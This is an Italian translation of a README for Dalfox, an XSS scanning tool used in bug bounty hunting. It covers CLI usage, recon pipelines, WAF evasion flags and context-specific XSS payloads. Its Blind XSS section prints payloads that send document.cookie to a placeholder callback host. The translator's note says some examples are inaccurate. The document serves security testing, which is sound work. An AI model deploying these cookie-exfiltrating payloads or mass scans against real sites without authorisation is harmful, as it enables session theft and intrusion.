# 🦊 Dalfox - Framework di scansione XSS

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Potente scanner XSS e strumento di analisi
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

> **Nota sulle versioni e sull'originale:** gli esempi usano la CLI della serie v2; la serie v3 ha rinominato diversi comandi e opzioni ([guida ufficiale alla migrazione](https://dalfox.hahwul.com/getting-started/migration/)). In modalità di scansione `-p` seleziona un parametro, non un singolo payload: gli esempi e la tabella che lo descrivono come payload sono inesatti ([chiarimento del progetto](https://github.com/hahwul/dalfox/issues/342)). L'endpoint e la porta dell'esempio server vanno verificati per la versione scelta. Saltare l'estrazione dei parametri non equivale a ignorare un fingerprint; l'elusione di un WAF non è garantita. Una riflessione o una combinazione con open redirect non dimostra automaticamente un impatto maggiore. I comandi originali sono conservati.

---

## 📋 Indice

- [Che cos'è Dalfox](#-che-cosè-dalfox)
- [Installazione](#-installazione)
- [Utilizzo di base](#-utilizzo-di-base)
- [Modalità di scansione](#-modalità-di-scansione)
- [Opzioni avanzate](#-opzioni-avanzate)
- [Blind XSS](#-blind-xss)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Dalfox

**Dalfox** è un potente scanner di vulnerabilità XSS e strumento di analisi:

- 🔍 **Analisi dei parametri** - Individua i punti di riflessione
- 🎯 **Rilevamento XSS** - Riflesse e basate sul DOM
- 💉 **Blind XSS** - Verifiche fuori banda
- ⚡ **Rapido** - Basato su Go, con elevata concorrenza

### Perché Dalfox?

| Funzionalità | Vantaggio |
|---------|---------|
| Analisi intelligente | Payload adattati al contesto |
| Rilevamento dei WAF | Aggiramento dei WAF comuni |
| Blind XSS | Supporto per interazioni fuori banda (OOB) |
| Modalità di estrazione dei parametri | Trova parametri nel codice JS |

---

## 🚀 Installazione

```bash
# Installazione con Go (consigliata)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Verifica
dalfox version
```

---

## 📖 Utilizzo di base

### Singolo URL

```bash
# Scansione di base
dalfox url https://example.com/search?q=test

# Salva l'output
dalfox url https://example.com/search?q=test -o results.txt
```

### Più URL

```bash
# Da stdin
cat urls.txt | dalfox pipe

# Da file
dalfox file urls.txt

# Con parallelismo
cat urls.txt | dalfox pipe -w 50
```

### Modalità silenziosa

```bash
# Mostra solo le vulnerabilità
dalfox url https://example.com/search?q=test --silence

# Senza colori
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Modalità di scansione

### Modalità URL

```bash
# Analizza un singolo URL
dalfox url https://example.com/page?param=value

# Analizza con dati
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Modalità pipe

```bash
# Da stdin
echo "https://example.com/search?q=test" | dalfox pipe

# Più URL
cat urls_with_params.txt | dalfox pipe
```

### Modalità file

```bash
# Da file
dalfox file urls.txt

# Con output
dalfox file urls.txt -o results.txt
```

### Modalità server

```bash
# Avvia il server API
dalfox server

# Porta personalizzata
dalfox server -p 8080

# Quindi invia le richieste:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

## ⚙ Opzioni avanzate

### Header personalizzati

```bash
# Aggiungi un header
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Più header
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookie e autenticazione

```bash
# Con cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Autenticazione Basic
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Payload personalizzati

```bash
# Usa un file di payload personalizzati
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Singolo payload personalizzato
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Formato dei payload nel file:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Formati di output

```bash
# Output JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Solo le vulnerabilità
dalfox url https://example.com/search?q=test --only-poc
```

### Prestazioni

```bash
# Imposta i worker (parallelismo)
dalfox url https://example.com/search?q=test -w 100

# Timeout (secondi)
dalfox url https://example.com/search?q=test --timeout 10

# Ritardo tra le richieste (ms)
dalfox url https://example.com/search?q=test --delay 100
```

### Elusione dei WAF

```bash
# Usa l'aggiramento dei WAF
dalfox url https://example.com/search?q=test --waf-evasion

# Ignora l'impronta
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# Proxy HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Per Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 Blind XSS

### Uso di payload Blind XSS

```bash
# Con XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# L'opzione -b aggiunge callback Blind XSS
```

### Blind XSS con payload personalizzato

```bash
# Payload blind personalizzato
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Esempi di payload blind

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Riferimento rapido

### Comandi di base

| Comando | Descrizione |
|---------|-------------|
| `dalfox url URL` | Analizza un singolo URL |
| `dalfox file file.txt` | Scansiona i bersagli da un file |
| `cat urls \| dalfox pipe` | Analizza da stdin |
| `dalfox server` | Avvia il server API |

### Opzioni essenziali

| Opzione | Descrizione |
|------|-------------|
| `-o file.txt` | File di output |
| `-w 50` | Worker (parallelismo) |
| `-H "Header: value"` | Header personalizzato |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Callback Blind XSS |
| `--proxy URL` | Proxy HTTP |
| `--timeout 10` | Timeout della richiesta |

### Opzioni di output

| Opzione | Descrizione |
|------|-------------|
| `--format json` | Output JSON |
| `--only-poc` | Mostra solo le prove di concetto (PoC) |
| `--silence` | Modalità silenziosa |
| `--no-color` | Output senza colori |

### Opzioni dei payload

| Opzione | Descrizione |
|------|-------------|
| `-p "payload"` | Payload personalizzato |
| `--custom-payload file` | File di payload |
| `--waf-evasion` | Modalità di aggiramento dei WAF |

---

## 🎯 Flussi di lavoro per il bug bounty

### Scansione XSS di base

```bash
# Scansione rapida
dalfox url "https://target.com/search?q=test" --silence
```

### Da una raccolta di URL

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Scansione su larga scala

```bash
# Analizza tutti i parametri degli URL
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Con pattern GF

```bash
# Uso di GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Con filtro httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Scansione autenticata

```bash
# Con sessione
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Pipeline completa

```bash
# Pipeline completa di ricerca XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Campagna Blind XSS

```bash
# Blind XSS su larga scala
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Specifico per i moduli di input
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Consigli per la ricerca di XSS

1. **Verifica tutti i parametri** - Non solo quelli evidenti
2. **Verifica contesti diversi** - HTML, JS, attributi
3. **Usa Blind XSS** - Per pannelli di amministrazione e log
4. **Combina con open redirect** - Per un impatto maggiore
5. **Verifica gli header della risposta** - CSP, X-XSS-Protection
6. **Verifica i parametri POST** - Spesso trascurati

### Punti comuni di inserimento XSS

```
- Caselle di ricerca
- Campi del profilo utente
- Commenti e feedback
- Parametri URL
- Header HTTP (Referer, User-Agent)
- Nomi dei file caricati
- Messaggi di errore
```

### Payload specifici per contesto

| Contesto | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attributo | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Risorse

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [Payload XSS](https://github.com/payloadbox/xss-payload-list)

### Schede correlate
- [Metodologia per il bug bounty](../../Bug-Bounty-Methodology/translations/README.it.md)
- [Payload XSS](../../Payloads/translations/XSS.it.md)
- [Burp Suite](../../Burp-Suite/translations/README.it.md)

---

<p align="center">
  <b>🦊 Trova vulnerabilità XSS!</b><br>
  <i>Dalfox - Un alleato nella ricerca di XSS</i>
</p>
